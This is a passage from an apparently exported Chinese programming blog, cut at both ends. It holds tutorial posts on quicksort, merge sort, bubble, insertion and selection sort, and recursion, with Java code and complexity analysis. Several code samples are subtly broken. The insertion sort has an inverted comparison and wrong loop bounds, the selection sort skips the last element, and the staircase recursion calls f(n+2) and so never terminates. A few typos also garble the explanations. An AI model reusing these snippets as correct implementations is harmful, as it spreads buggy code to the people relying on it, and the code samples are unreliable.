(i&lt;j &amp;&amp; arr[j] &gt;= base) j--; while (i&lt;j &amp;&amp; arr[i] &lt;= base) i++; if (i&lt;j)&#123; int temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; &#125; &#125; arr[left] = arr[i]; arr[i] = base; return i;&#125;// 查找中间位置private static int partation1(int[] a, int left, int right)&#123; int pivot = a[right]; int i = left; for (int j=left; j&lt;=right-1;j++)&#123; if (a[j]&lt;pivot)&#123; int temp = a[i]; a[i] = a[j]; a[j] = temp; i++; &#125; &#125; a[right] = a[i]; a[i] = pivot; return i;&#125; 归并排序有一个merge合并函数，快排这里也有一个partation分区函数。partation分区函数实际上我们前面已经讲过了，就是随机选择一个元素作为pivot，然后对A[p…r]分区，函数返回pivot的小标。 如果我们不考虑空间消耗的话，partation分区函数可以写的非常简单。我们申请两个临时数组X和Y，遍历A[p…r]，将小于pivot的元素都拷贝到临时数组X中，将大于pivot的元素都拷贝到临时数组Y中，最后再讲数组X和数组Y中的数据顺序拷贝到数组A[p…r]中。 不过如果按这种思路实现的话，partation函数就需要很多额外的内存空间，所以快排也就不是原地排序算法了。如果我们希望快排是原地排序算法，那它的空间复杂度都是O(1)，那partation分区函数就不能占用太多的内存空间，我们就需要在A[p…r]原地完成分区操作。 原地分区函数的实现思路非常巧妙，我下面用伪代码实现： 12345678910111213partation(a,p,r)&#123; pivot := A[r] i := p; for j:=p to r-1 do &#123; if A[j] &lt; pivot&#123; swap A[i] with A[j] i := i+1 &#125; &#125; swap A[i] with A[r] return i&#125; 这里的处理有点类似于选择排序。我们通过游标i把A[p…r-1]分成了两部分，A[p…i-1]的元素都是小于pivot的，我们暂且叫它“已处理区间”，A[i…r-1] 是“未处理区间”。我们每次从未处理区间A[i…r-1]中取一个元素A[j]，与pivot对比，如果小于pivot，则将其加入到已处理区间的尾部，也就是 A[i] 的位置。 数组的插入操作还记得吗？在数组某个位置插入元素，需要搬移数据，非常耗时。当时我们也讲了一种技巧，就是交换，在O（1）时间复杂度内完成插入操作。我们也借助这个思想，只需要将 A[i] 和 A[j] 交换，就可以在O（1）时间复杂度内将 A[j] 放到小标 i 的位置。 因为分区的操作涉及交换操作，如果数组中出现两个相同的元素，比如序列6,8,7,6,3,5,9,4，在经过第一次分区之后，两个6的相对位置就会发现变化。所以快速排序并不是一个稳定的排序算法。 到此，快速排序的原理你应该掌握了。现在，我们来看另一个问题：快速排序和归并排序都是用的分治思想，递推公式和递归代码也非常相似，那它们的区别到底在哪里呢？ 可以发现，归并排序的处理过程是由下到上的，先处理子问题，然后在合并。而快排正好相反，他的处理过程是由上到下的，先分区，然后处理子问题。归并排序虽然是稳定的，时间复杂度为$O(n*log_{2}n)$的排序算法，但是它是非原地排序算法。我们上面讲过，归并排序之所以不是原地排序算法，是因为合并函数无法在原地执行。而快排通过设计巧妙的分区函数，可以实现原地排序，解决了归并排序占用太多内存空间的问题。 快速排序的性能分析 现在我们来分析一下快速排序的性能。上面在讲解快排原理的时候，已经分析了快速排序的稳定性和空间复杂度。快排是一种原地、不稳定的排序算法，现在我们来分析一下快排的时间复杂度。 快排也是用递归实现的，对于递归代码的时间复杂度，我前面总结的公式，这里也还是适用的。如果每次分区操作，都能正好把数组分成大小接近相等的两个小区间，那块拍的时间复杂度递推求解公式跟归并是一样的。所以快排的时间复杂度也是$O(n*log_{2}n)$。 $$\begin{cases} \\\ T(1) = C; &amp; n=1 \\[2ex]\ T(n) = 2*T(\frac{n}{2}) + n; &amp; n&gt;1\end{cases}$$ 但是公式成立的前提是我们每次分区操作，选择的pivot都很合适，正好是将大区间对等一份为二，但这种情况是很难实现的。 我举一个极端的例子，加入数组中的数据原来就已经是有序的了，比如1,3,5,6,8，如果我们每次选择最后一个元素作为pivot，那每次分区得到的两个区间都是不对等的。我们需要进行大约n次分区操作，才能完成快排的整个过程，这种情况下，快排的时间复杂度就从$O(n*log_{2}n)$退化成了$O(n^2)$。 我们刚刚讲了两个极端情况下的时间复杂度，一个是分区极其均衡，一个是分区极其不均衡。他们分别对应到快排的最好时间复杂度和最坏情况时间复杂度。那快排的平均时间复杂度是多少呢？ 实际上，递归的时间复杂度的求解除了递推公式之外，还有递归树，在树那一节再讲，这里暂且不说，这里直接给出结论：快排的平均复杂度也是$O(n*log_{2}n)$，只有在极端情况下才会退化为$O(n^2)$。而且我们也有办法将这个概率降到很低，如何来做，我们后面排序优化再讲。 解答开篇 快排的核心思想是分治和分区。我们可以利用快排的思想，来解答开篇的问题：O(n)的时间复杂度内求解无序数组中第K大元素，比如4,2,5,12,3这样一组数据，第三大元素就是4。 我们选择数组区间A[p…r]最后一个元素A[n-1]作为pivot，对数组A[0…n-1]进行原地分区，这样数组就分成了三部分，A[0…p-1]、A[p]、A[p+1…n-1]。 如果p+1=K，那么A[p]就是要求解的元素，如果K&gt;p+1，说明第K大元素出现在A[p+1…n-1]区间内，我们再按照上面的思路在A[p+1…n-1]内查找。同理，如果K&lt; p+1，那我们就在A[0…p-1]区间内查找。 我们再来看看，为什么上述解决问题的时间复杂度是O(n)呢？ 第一次分区查找，我们需要对大小为n的数组进行分区操作，遍历n个元素。第二次分区查找，只需要对大小为2/n的数组执行分区操作，需要遍历n/2个元素。以此类推，分区遍历的元素个数分别为n、n/2、n/4、n/8、n/16……直到区间缩小为1. 如果我们把每次分区遍历的元素个数加起来，就是：n+n/2+n/4+n/8+……+1。这是一个等比数列求和。最后的和为2n-1，所以上述解决问题的时间复杂度为O(n)。 内容小结 归并排序和快速排序是两种稍微复杂的排序算法，他们用的都是分治的思想，代码都是通过递归来实现的。过程非常相似。理解归并排序的重点是理解递推公式和merge合并函数。同理，理解快排的重点是理解递推公式和partation分区函数。 归并排序是一种在任何情况下时间复杂度都比较稳定的算法，这也使得它具有了致命的弱点，即归并排序并不是原地排序算法，空间复杂度比较高，是O(n)。正应为此，他也没有快排应用广泛。 快速排序算法虽然最坏情况时间复杂度是O(n^2),但是平均情况下时间复杂度都是$O(n*log_{2}n)$。不仅如此，快速排序时间复杂度退化到O(n^2)的概率也非常小，我们可以通过合理的选择pivot来避免这种情况。 课后思考1、现在你有10个接口访问日志文件，每个日志文件大小300MB，每个日志文件里的日志都是按照时间戳从小到大排序的。你希望将这10个较小的日志文件，合并为一个日志文件，合并之后的日志仍然按照时间从小到大排序。如果处理上述排序任务的机器内存只有1GB，你有什么好的解决思路，能快速的将10个日志文件合并吗？ 多路归并、外排序 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>排序</tag>
        <tag>快速排序</tag>
        <tag>归并排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-排序(上)]]></title>
    <url>%2Fposts%2F2018-09-20-%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F(%E4%B8%8A).html</url>
    <content type="text"><![CDATA[前言 排序对一个程序员来说，可能都不会陌生。大部分编程语言中，也都提供了排序函数。在平常的项目中，也经常会用到排序。排序非常重要，所以会分几节详细讲一讲经典的排序算法。 排序算法太多了，可能有的连名字都没有听说过，比如猴子排序、睡眠排序、面条排序等等。这里只列举众多排序算法众多的一小撮，也是最经典的、最常用的：冒泡排序、插入排序、选择排序、归并排序、快速排序、计数排序、基数排序、桶排序。按照时间复杂度把他们分成了三类，分上中下三节来讲。 排序算法 时间复杂度 是否基于比较 上 冒泡、插入、选择 $ O(n^2) $ √ 中 快排、归并 $ O(nlogN) $ √ 下 桶、计数、基数 $ O(n) $ × 带着问题去学习，是最有效的学习方法。所以按照惯例，先给出思考题：插入排序和冒泡排序的时间复杂度相同，都是$O(n^2)$，在实际软件开发里，为什么更倾向于使用插入排序而不是冒泡排序呢？ 如何分析一个排序算法 学习排序算法，除了学习他的算法原理、代码实现之外，更重要的是学会如何评价、分析一个排序算法。那么要分析一个排序算法，要从哪几方面入手呢？ 一、 算法的执行效率对于排序算法的执行效率的分析，我们一般会从以下几点来进行衡量： 1、最好情况、最坏情况、平均情况时间复杂度 我们在分析排序算法的时间复杂度时，要分别给出最好情况、最坏情况、平均情况下的时间复杂度。除此之外，你还要说出最好情况、最坏情况时间复杂度对应的要排序的原始数据是什么样。 为什么要区分这三种时间复杂度呢？第一，有些排序算法会区分，为了好对比，我们最好都做一下区分。第二，对于要排序的数据，有的接近有序，有的接近无序。有序度不同的数据集，对于排序的执行时间肯定会有影响的，我们要知道排序算法在不同数据下的性能表现。 2、时间复杂度的系数、常数、低阶 我们知道，时间复杂度反应的是数据规模n很大的时候的一个增长趋势，所以它表示的时候会忽略系数、常数、低阶。但是实际的软件开发中，我们排序的可能是10个、100个、1000个这样数据规模较小的数据，所以，在对同一阶时间复杂度的排序算法性能对比的时候，我们就要把系数、常数、低阶也考虑进来。 3、比较次数和交换次数 这一节和下一节讲的都是基于比较的排序算法。基于比较的排序算法的执行过程中，会涉及两种操作，一个是元素比较大小，另一个是元素交换或移动。所以，如果我们在分析排序算法的执行效率的时候，应该把比较次数和交换次数考虑进去。 二、 算法的内存消耗前面讲过算法的内存消耗可以通过空间复杂度来衡量，排序算法也不例外。不过针排序算法的空间复杂度，我们引入一个新概念，原地排序。原地排序算法，就是特指空间复杂度为O(1)的排序算法，我们这节讲的三种排序算法都是原地排序算法。 三、 排序算法的稳定性仅仅用执行效率和内存消耗来衡量排序算法的好坏是不够的。针对排序算法，我们还有一个重要的度量指标，稳定性。这个概念是说，如果待排序的序列中存在值相同的元素，经过排序之后，相等元素之间原有的先后顺序不变。 我通过一个例子来解释一下。比如我们有一组数据2,9,3,4,8,3，按照大小排序之后就是2,3,3,4,8,9。 这组数据里有两个3，经过某种排序算法排序之后，如果两个3的前后顺序没有改变，那我们就把这种排序算法叫做稳定的排序算法；如果前后顺序发生变化，那对应的排序算法就叫做不稳定的排序算法。 你可能要问了，这两个3哪个在前，哪个在后有什么关系啊。稳不稳定又有什么关系呢？为什么要考察排序算法的稳定性呢？ 很多数据结构和算法的课程，再讲排序的时候，都是用整数来举列的。但在真正的软件开发中，我们要排序的往往不是单纯的整数，而是一组对象，我们需要按照对象的某个key来排序。 比如说，我们现在要给电商交易系统的“订单”排序，订单有两个属性，一个是下单时间，一个是订单金额。如果我们现在有10万条订单数据，我们希望按照订单金额从小到大对订单数据进行排序，对于金额相同的订单，我们希望按照下单时间从早到晚有序，对于这样一个排序需求，我们怎么来做呢？ 最先想到的方法是，我们先按照金额对订单数据进行排序，然后，在遍历排序之后的订单数据，对于每个金额相同的小区间再按照下单的时间排序。这种排序思路理解起来不难，但是实现起来会很复杂。 但是借助稳定排序算法，这个问题可以非常简洁的解决。解决思路是这样的，我们先按照下单时间给订单排序，注意是下单时间，不是订单金额，排序完成之后，我们再用稳定排序算法，按照订单金额重新排序。这样两遍排序之后，我们得到的就是订单数据按照金额大小从小到大排序，金额相同的订单按照下单时间从早到晚排序的。为什么呢？ 稳定排序算法可以保持金额相同的两个对象，再排序前后的顺序保持不变。第一次排序之后，所有的订单按照下单时间从早到晚有序了。在第二次排序中，我们用的是稳定的排序算法，所以经过第二次排序之后，相同金额的订单仍然保持下单时间从早到晚有序。 冒泡排序 我们从冒泡排序开始，学习今天的三种排序算法。 冒泡排序只会操作相邻的两个数据。每次冒泡排序都会对相邻的两个数据进行比较，看是否满足大小关系要求，如果不满足就让它两互换。一次冒泡会让至少一个元素移动到它应该在的位置，重复n次，就完成了对n个数据的排序工作。 我用一个例子，带你看下冒泡排序的整个过程。我们要对一组数据4,5,6,3,2,1，从小到大进行排序。第一次冒泡排序的详细过程就是这样： 可以看出，经过第一次冒泡排序之后，6这个元素已经存储在正确的位置上了。要想完成所有数据的排序，我们只需要进行6次这样的冒泡排序操作就对了。 实际上，刚才的冒泡排序还可以优化，当某次操作已经没有数据交换时，说明已经完全有序，不需要在执行后续的冒泡操作了。我这里给一个例子，这里面给6个元素排序，只需要4次冒泡操作就可以了。 冒泡次数 冒泡结果 是否有数据交换 初始状态 3，5，4，1，2，6 - 第一次冒泡 3，4，1，2，5，6 有 第二次冒泡 3，1，2，4，5，6 有 第三次冒泡 1，2，3，4，5，6 有 第四次冒泡 1，2，3，4，5，6 无，结束排序操作 冒泡排序算法的原理比较好理解，具体的代码如下，你可以结合代码理解原理。 123456789101112131415// 冒泡排序 a表示需要排序的数组 n表示数组的大小public void bubbleSort(int[] a,int n)&#123; for(int i=0;i&lt;n-1;i++)&#123; boolean flag = false; for(int j=0;j&lt;n-1-i;j++)&#123; if(a[j]&gt;a[j+1])&#123; int temp = a[j]; a[j] = a[j+1]; a[j+1] = temp; flag = true; &#125; &#125; if(!flag) break; &#125;&#125; 现在结合上面分析算法的三个方面，有三个问题要问你。 第一、冒泡排序是原地排序算法吗？ 冒泡的过程只涉及相邻两个数据的交换操作，字需要一个常量级的临时空间，所以它的空间复杂度是O(1)，是一个原地排序算法。 第二、冒泡排序是稳定的排序算法吗？ 在冒泡排序中，只有交换才可以改变两个元素的前后位置。为了保证冒泡排序算法的稳定性，当有相邻的两个元素相等时，我们不做交换，相同大小的数据在排序前后不改变顺序，所以冒泡排序算法是稳定的排序算法。 第三、冒泡排序的时间复杂度是多少？ 最好的情况下，要排序的数据已经是有序的了，我们只需要进行一次冒泡排序就可以了，所以最好的时间复杂度为$O(n)$。而在最坏情况下，要排序的数据是倒序排列的，我们需要进行n次冒泡排序，所以最坏情况时间复杂度为$O(n^2)$。 最好、最好情况时间复杂度很容易区分，那平均情况时间复杂度是多少呢？我们前面讲过，平均时间复杂度就是加权平均期望时间复杂度，分析的时候要结合概率论的知识。 对于包含n个元素的数组，这n个数据有 n! 种排列方式。不同的排列方式，冒泡排序执行的时间是不同的。比如我们前面举的那个例子，一个需要6次冒泡，而另一个只需要4次。如果用概率论的方法定量分析平均时间复杂度，那涉及到的数学推理和计算就会很复杂。我这里还有一种思路，通过有序度和逆序度这两个概念来分析。 有序度是数组中具有有序关系的元素对的个数。有序元素对用数学表达式表示就是这样： $a[i] &lt;= a[j], 如果i &lt; j$。 2,4,3,1,5,6 这组数据的有序度为11。因其有序元素对为11个，分别是: (2,4) (2,3) (2,5) (2,6) (4,5) (4,6) (3,5) (3,6) (1,5) (1,6) (5,6) 同理，对于一个倒序排列的数组，比如 6,5,4,3,2,1，有序度为0；对于一个完全有序的数组，比如1,2,3,4,5,6，有序度就是n*(n-1)/2，也就是15.我们把完全有序的数组的有序度叫做满有序度。 逆序度的定义正好跟有序度的定义相反(默认从小到大为有序)，我想你已经想到了。关于逆序度，我们就不举例子说明了。你可以结合有序度的例子自己看一下：$a[i] &gt; a[j], 如果i &lt; j$。 关于这三个概念，我们可以得到一个公式：逆序度 = 满有序度 - 有序度。我们排序的过程就是一种增加有序度，减少逆序度的过程，最后达到满有序度，就说明排序完成了。 我还是拿前面举得那个冒泡排序的例子说明。要排序的数组的初始状态为4,5,6,3,2,1，其中，有序元素对(4,5)、(4,6)、(5,6)，所以有序度为3。 n=6，所以排序完成之后终态的满有序度为15. 冒泡次数 冒泡结果 有序度 初始状态 4，5，6，3，2，1 3 第一次冒泡 4，5，3，2，1，6 6 第二次冒泡 4，3，2，1，5，6 9 第三次冒泡 3，2，1，4，5，6 12 第四次冒泡 2，1，3，4，5，6 14 第五次冒泡 1，2，3，4，5，6 15 冒泡排序包含两个原子操作，比较和交换。每交换一次，有序度就加1,。不管算法怎么改进，交换次数是确定的，即为逆序度，也就是n*(n-1)/2 - 初始有序度。此例中就是15-3=12，也就是要进行12次交换操作。 对于包含n个数据的数组进行冒泡排序，平均交换次数是多少呢？最坏情况下，初始状态的有序度为0，所有要进行n*(n-1)、2次交换。最好情况下，初始状态的有序度为满有序度，就不需要进行交换。我们去平均值n*(n-1)/4，来表示初始有序度既不是很高也不是很低的平均情况。 换句话说，平均情况下需要n*(n-1)/4次交换操作，比较操作肯定要比交换操作多，而时间复杂度的上限位$O(n^2)$，所以平均情况下的时间复杂度就是$O(n^2)$。 这个平均时间复杂度的推导过程并不严格，但是很多时候很有用，毕竟概率论的定量分析太复杂，不太好用。 插入排序 我们先来看一个问题。如果一个有序的数组，我们往里面添加一个新的数据后，如何继续保持数据有序呢？很简单，我们只要遍历数组，找到数据应该插入的位置将其插入即可。 这是一个动态排序的过程，即动态的往有序集合中添加数据，我们可以通过这种方法保持集合中的数据一直有序。而对于一组静态数据，我们也可以借鉴上面讲的插入方法，来进行排序，于是就有了插入排序算法。 那插入排序是如何借助上面的思想来实现排序的呢？ 首先，我们将数组中的数据分为两个区间，已排序区间和未排序区间。初始已排序区间只有一个元素，就是数组中的第一个元素。插入排序算法的核心思想是取未排序区间的元素，在已排序区间中找到合适的位置插入，并保证已排序区间中的元素一直有序，重复这个过程，知道未排序区间中元素为空，算法结束。 如图所示，要排序的数据是4,5,6,1,3,2，其中左侧为已排序区间，右侧为未排序区间。 插入排序也包含两种操作，一种是元素的比较，一种是元素的移动。当我们需要将一个元素a插入到已排序区间时，需要先拿a和已排序区间的元素一次比较大小，找到合适的位置插入。找到插入点之后，我们还需要将插入点之后的额元素顺序往后移动一位，这样才能腾出空间为元素a插入。 对于不同的查找插入点的方法（从头到尾、从尾到头），元素的比较次数是有区别的。但对于一个给定的初始序列，移动操作的次数是固定的，就等于逆序度。 为什么说移动次数就等于逆序度呢？我拿刚才的例子画一个图表，你一看就明白了。满有序度是n*(n-1)/2=15, 初始有序度为5，所以逆序度为10,。插入排序中，数据移动的个数总和也等于3+3+4=10。 插入排序的原理也很简单吧。你也可以结合一下代码理解插入排序： 123456789101112131415public void insertSort(int[] a, int n)&#123; if(n&lt;=1) return; for(int i=1;i&lt;n-1;i++)&#123; int val = a[i]; int j=i-1; for(;j&gt;0;j--)&#123; if(a[j]&lt;val)&#123; a[j+1] = a[j]; &#125;else &#123; break; &#125; &#125; a[j+1] = val; &#125;&#125; 现在同样有三个问题。 第一、插入排序是原地排序算法吗？ 从实现过程可以明显的看出，插入排序的运行不需要额外的存储空间，所以插入排序的空间复杂度为O(1)，是一个原地排序算法。 第二、插入排序是稳定的排序算法吗？ 在插入排序中，对于值相同的元素，我们可以选择将后面出现的元素，插入到前面出现的元素的后面，这样就可以保持原有的前后顺序不变，所有插入排序是稳定排序算法。 第三、插入排序的时间复杂度是多少？ 如果要排序的数据已经是有序的，我们并不需要搬移任何数据。如果我们从尾到头在有序数组里查找插入位置，每次只需比较一个数据就能确定插入的位置。所以这种情况下，最好是时间复杂度为O(n)。注意，这里是从尾到头遍历已经有序的数据。 如果数组是倒序的，每次插入都相当于在数组的第一个位置插入新的数据，所以需要搬移大量的数据，所以最坏情况下的时间复杂度为$O(n^2)$。 还记得我们在一个数组中插入一个数据的平均复杂度是多少吗？没错，是O(n)，所以对于插入排序来说，每次插入操作都相当于在数组中插入一个数据，执行n次插入操作，所以平均时间复杂度为$O(n^2)$。 选择排序 选择排序算法的实现思路有点类似插入排序，也分已排序区间和未排序区间。但是选择排序每次会从未排序区间中找到最小元素，将其放到已排序区间的末尾。 同样，也有三个问题需要你思考。 第一、插入排序是原地排序算法吗？ 首先选择排序的空间复杂度为O(1)，所以是一种原地排序算法。 第二、插入排序的时间复杂度是多少？ 选择排序最好情况时间复杂度、最坏情况时间复杂度、平均情况时间复杂度均为$O(n^2)$。你可以自己分析看看。 第三、插入排序是稳定的排序算法吗？ 答案是否定的，选择排序是一种不稳定的排序算法。从选择排序的原理示意图可以看出，选择排序每次都要找剩余排序元素中的最小值，并和前面元素交换位置，这就破坏了稳定性。 比如5,8,5,2,9这样一组数据，使用选择排序来排序的话，第一次找到最小元素2，与第一个5交换位置，那第一个5个中间5的顺序就变了，所以就不稳定了。正是因此，相对于冒泡排序和插入排序，选择排序就稍微逊色了。 1234567891011public void selectSort(int[] a, int n)&#123; for(int i=0;i&lt;n-1;i++)&#123; for(int j=i+1; j&lt;n-1;j++)&#123; if(a[j]&lt;a[i])&#123; int temp = a[j]; a[j] = a[i]; a[i] = temp; &#125; &#125; &#125;&#125; 解答开篇 基本的知识都讲完了，我们来看看开篇的问题：冒泡排序和插入排序的时间复杂度都为$O(n^2)$，都是原地排序算法，为什么插入排序要比冒泡排序更受欢迎呢？ 我们前面分析冒泡排序和插入排序的时候讲到，冒泡排序不管怎么优化，元素交换的次数是一个固定的值，是原始数据的逆序度。插入排序是同样的，不管怎么优化，移动次数等于原始数据的逆序度。 但是从代码实现上来看，冒泡排序的数据交换要比插入排序的数据移动要复杂，冒泡排序需要3个赋值操作，而插入排序只需要一个。我们来看一下下面这段操作： 1234567891011121314// 冒泡排序中的数据交换操作 if(a[j]&gt;a[j+1])&#123; int temp = a[j]; a[j] = a[j+1]; a[j+1] = temp; flag = true;&#125;// 插入排序中数据移动操作if(a[j]&lt;val)&#123; a[j+1] = a[j];&#125;else &#123; break;&#125; 我们把执行一个赋值语句的时间粗略的估计为单位时间unit_time，然后分别用冒泡排序和插入排序对同一个逆序度为K的数组进行排序。用冒泡排序需要K次交换操作，每次需要3个赋值语句，所以交换操作总耗时就是3K单位时间。而插入排序中数据移动操作只需要K个单位时间。 所以，虽然冒泡排序和插入排序的时间复杂度是一样的，但是如果我们希望把性能优化做到极致，那肯定首选插入排序。插入排序的算法思路也有很大的优化空间，我们只讲了最基础的一种。如果你对插入排序的优化感兴趣，可以自己学习一下希尔排序。 内容小结 想要分析、评价一个排序算法，需要从执行效率、内存消耗和稳定性三个方面来看。因此这一节，分析了三种时间复杂度为$O(n^2)$的排序算法：冒泡排序、插入排序、选择排序。需要重点掌握的是它们的分析方法。 排序算法 是否原地排序 是否稳定 最好 最坏 平均 冒泡排序 √ √ $O(n)$ $O(n^2)$ $O(n^2)$ 插入排序 √ √ $O(n)$ $O(n^2)$ $O(n^2)$ 选择排序 √ × $O(n^2)$ $O(n^2)$ $O(n^2)$ 这三种时间复杂度为$O(n^2)$的排序算法中，冒泡排序、选择排序可能就纯粹停留在理论的层面了，实际开发中应用并不多，但是插入排序还是挺有用的。后面讲排序优化的时候，有些语言的排序函数的实现会用到插入排序算法。 今天讲的三种算法，实现代码都非常简单，对于小规模的数据排序，用起来非常高效，但是在大规模数据排序的时候，这个时间复杂度就稍微有点高了。所以我们更倾向于使用下一节讲的时间复杂度为$O(n*logn)$的排序算法。 课后思考我们讲过，特定的算法是依赖于特定的数据结构的。我们今天讲的几种排序算法，都是基于数组实现的。如果数组存储在链表中，这三种排序算法还能工作吗？如果能，相应的时间、空间复杂度又是多少？ (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>排序</tag>
        <tag>冒泡排序</tag>
        <tag>插入排序</tag>
        <tag>选择排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-递归]]></title>
    <url>%2Fposts%2F2018-09-18-%E7%AE%97%E6%B3%95-%E9%80%92%E5%BD%92.html</url>
    <content type="text"><![CDATA[前言 推荐注册返佣金这个功能我想你应该不陌生吧？现在很多app都有这个功能。这个功能中，用户A推荐用户B注册，用户B又推荐了用户C注册，我们可以说C的“最终推荐人”为用户A，用户B的“最终推荐人”也为用户A，用户A没有“最终推荐人”。 一般来说，我们会通过数据库记录这种推荐关系，在数据库表中，我们可以记录两行数据，其中actor_id表示用户id，referrer_id表示推荐人id。 actor_id referer_id B A C B 基于这个背景，我的问题是，给定一个用户ID，如何查找这个用户的“最终推荐人”？ 带着这个问题，我们来学习今天的内容，递归（Recursion）！ 如何理解递归 从我自己学习数据结构和算法的经历来看，我个人觉得，有两个最难理解的知识点，一个是动态规划，另一个就是递归。 递归是一种应用非常广泛的算法，之后很多的数据结构和算法的编码实现都要用到递归，比如DFS深度优先搜索，前中后序二叉树遍历等等，所以，搞懂递归非常重要，否则，后面复杂一点的数据结构和算法学起来就会比较吃力。 不过，别看我说了这么多，递归本身可一点不“高冷”，我们生活中就有很多用到递归的例子。 比如周末你带着女朋友去电影院看电影，女朋友问你，我们坐在第几排？电影院太黑了，没法数，现在你怎么办？ 这时候递归就派上用场了，于是你问前面一排的人他是第几排，你想只要在他的数字上加一，就知道自己在那一排了。但是，前面的人也不清楚，所以他也问他前面的人，就这样一排一排往前问，直到问道第一排的人，说我在第一排，然后在这样一排一排再把数字传回来，直到你前面的人告诉你他在那一排，于是你就知道答案了。 这就是一个标准的用递归求解问题的分解过程，去的过程叫“递”，回来的过程叫“归”。基本上，所有的递归问题都可以用递推公式来表示，刚刚这个生活中的例子，我们用递推公式来表示就是下面这样的 $$ f(n) = f(n-1) +1 ;\ 其中f(1)=1 $$ f(n)表示你想知道自己在那一排，f(n-1) 表示前面一个人所在的排数，f(1)=1表示第一排的人知道自己在第一排。有了这个递推公式，我们就可以很轻松的将它改为递归代码：1234int f(int n)&#123; if(n==1) return 1; return f(n-1)+1;&#125; 什么时候可以用递归呢 刚刚这个例子是典型的递归，那究竟什么问题可以用递归来解决呢？我这总结了三个条件，只要同时满足以下三个条件，就可以用递归来解决 。 1、一个问题的解可以分解为几个子问题的解 何为子问题？子问题就是数据规模更小的问题。比如，前面的电影院的例子，你要知道自己在哪排，可以分解为”前一排的人在那一排？”这样一个子问题。 2、这个问题与分解之后的子问题，除了数据规模不同，求解思路完全一样 还是以电影院的例子说明，你求解“自己在那一排”，和前面的人求解“自己在那一排”的思路，是完全一样的。 3、存在递归终止条件 把问题分解为子问题，再把子问题分解为子子问题，一层一层分解，不能存在无限循环，这就需要存在终止条件。在电影院的例子中，第一排的人不需要再继续询问任何人，就知道自己在那一排，也就是f(1)=1，这就是递归的终止条件。 如何写递归代码 说了这么多，那如何写递归代码呢？个人觉得，写递归代码最关键的是写出递推公式，找到终止条件，剩下将递推公式转化为代码就很容易了。 我这里举个例子，来一步一步实现递归代码。 如果有n个台阶，每次你可以跨 1 个台阶或者 2 个台阶，请问走完这n个台阶有多少种走法？ 如果有7个台阶，你可以走2、2、2、1这样上去，也可以走1、2、1、1、2这个样子上去，总之有很多中走法，那如何用编程来求总共有多少种走法呢？ 我们仔细想一下，实际上，可以根据第一步的走法把所有走法分为两类，第一类是第一步走了1个台阶，另一类是第一步走了2个台阶，所以，n个台阶的走法就等于先走一个台阶后，n个台阶的走法加上先走2个台阶后，n-2个台阶的走法，用公式表示就是：$$f(n) = f(n-1) + f(n-2) $$ 有了递推公式，递归代码基本就完成了一半。我们再来看下终止条件。当有一个台阶时，我们不需要再继续递归，就只有一种走法，所以f(1)=1。那么这个终止条件够吗？我们可以用n=2，n=3这些较小的数实验一下。 n=2时，f(2)=f(1)+f(0),已知的终止条件为f(1)=1,所以f(2)就无法求解了，所以除了f(1)=1这个终止条件之外，我们还需要f(0)=1，表示0个台阶有一种走法，不过这样就不符合正常逻辑了。所以我们可以把f(2)作为一个终止条件，表示走2个台阶，有两种走法（一步走完或者分两步走）。 所以最终的终止条件就是f(1)=1,f(2)=2。这个时候，可以拿n=3，n=4来验证一下，这个终止条件是否足够或者正确。 我们把刚刚的递推公式和终止条件放到一起就是最终的递推公式：$$ f(n) = f(n-1) + f(n-2); \ 其中 \ f(1)=1, f(2)=2; $$ 有了上面的递推公式，转化成代码就简单多了，最终的递归代码如下：12345int f(int n) &#123; if(n==1) return 1; if(n==2) return 2; return f(n-1)+f(n+2);&#125; 总结一下，写递归代码的关键就是要找到如何将大问题分解为小问题的规律，并且基于此写出递推公式，然后在推敲递推终止条件，最后再将递推公式转化为递归代码。 讲了这么多方法，是不是你现在还是有种想不太清楚的地方呢？实际上，这也是文章开头我说递归代码比较难理解的地方。 上面举的电影院的例子，我们的递归调用只有一个分支，也就是说“一个问题只需要分解为一个子问题”，我们可以很容易的想清楚“递”和“归”的每一个步骤，说以写起来、理解起来都不难。 但是，当我们面对的是一个问题分解为多个子问题的情况时，递归代码就没那么好理解了。 像刚刚讲的第二个爬台阶的例子，人脑几乎没办法把整个”递”和”归”的过程一步一步都想清楚。 计算机擅长做重复的事，所以递归正和它的胃口。而我们人脑更喜欢平铺直述的思维方式，当我们看到递归时，我们总想把递归平铺展开，脑子里就会循环，一层一层往下调，然后在一层一层返回，试图搞清楚计算机每一步是怎样执行的，这样就会很容易绕进去。 对于递归代码，这种试图想清楚整个递和归过程的做法，实际上是进入了一个思维误区。很多时候，我们理解起来比较吃力，主要原因就是自己给自己制造了这种理解障碍。那正确的思维方式应该是怎样的呢？ 如果一个问题A可以分解为若干子问题B、C、D，你可以假设子问题B、C、D已经解决，在此基础上思考和解决问题A，而且，你只需要思考问题A和子问题B、C、D两层之间的关系即可，不需要一层一层往下思考子问题与子子问题，子子问题与子子子问题之间的关系。屏蔽掉递归细节，这样子理解起来就简单多了。 因此，编写递归代码的关键是，只要遇到递归，我么就把它抽象成一个递推公式，不用想一层层的调用关系，不要试图用人脑去分解递归的每个步骤 递归代码警惕堆栈溢出 在实际的软件开发中，编写递归代码时，我们会遇到很多问题，比如堆栈溢出，而堆栈溢出会造成系统性崩溃，后果会非常严重。为什么递归代码容易造成堆栈溢出呢？我们又如何预防堆栈溢出呢？ 在”栈”那一节讲过，函数调用会使用栈来保存临时变量。每调用一个函数，都会将临时变量封装为栈帧压入内存栈，等函数执行完返回时，才出栈。系统栈或虚拟机栈一般都不会很大，如果递归求解的数据规模很大，调用层次很深，一直压入栈，就会有堆栈溢出的风险。 比如上面求解的电影院的例子，如果我们将系统栈或者虚拟机栈的大小设置为1KB，在求解f(19999)时就会出现如下堆栈错误：1Exception in thread "main" java.lang.StackOverflowError 那么如何避免堆栈溢出呢？ 我们可以通过在代码中限制递归调用的最大深度的方式来解决这个问题。递归调用超过一定深度（比如1000）之后，我么就不在继续往下递归了，直接返回报错。还是电影院那个例子，我们可以改造成下面这个样子，就可以避免堆栈溢出了。不过，我这写的是些伪代码，为了代码的简洁，有些边界条件没有考虑，比如n&lt;=0。 123456789// 